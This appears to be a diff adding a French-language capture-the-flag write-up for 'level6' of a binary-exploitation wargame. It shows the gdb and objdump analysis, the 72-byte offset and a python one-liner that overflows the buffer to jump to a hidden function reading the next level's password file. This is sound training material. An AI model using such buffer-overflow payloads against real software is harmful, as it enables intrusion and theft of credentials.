@@ -1,4 +1,43 @@
-Bufferoverflow
+./level6
+segfault
+
+./level6 A
+nope
+
+./level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+segfault
+
+objdump -R level6:
+    08049814 R_386_JUMP_SLOT   puts
+
+On en conclut qu'on peut executer une bufferoverflow
+
+On get l'offset avec gdb et un pattern generator
+offset=72
+
+On regarde ce qu'on peut appeler: 
+
+info function
+    ...
+    0x08048454  n
+    0x08048468  m
+    0x0804847c  main
+    ...
+
+Une fonction n existe et n'est jamais appelée (après une legère recherche)
+
+disas n
+    ...
+    0x0804845a <+6>:     movl   $0x80485b0,(%esp)
+    0x08048461 <+13>:    call   0x8048370 <system@plt>
+    ...
+
+x/s 0x80485b0
+    0x80485b0:       "/bin/cat /home/user/level7/.pass"
+
+Elle fait un appel à system avec comme paramètre /bin/cat /home/user/level7/.pass
+
+On va donc utiliser notre bufferoverflow, avec un offset à 72, pour appeler n à l'adresse: 0x08048454
 
 python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /tmp/exploit6
 ./level6 `cat /tmp/exploit6`
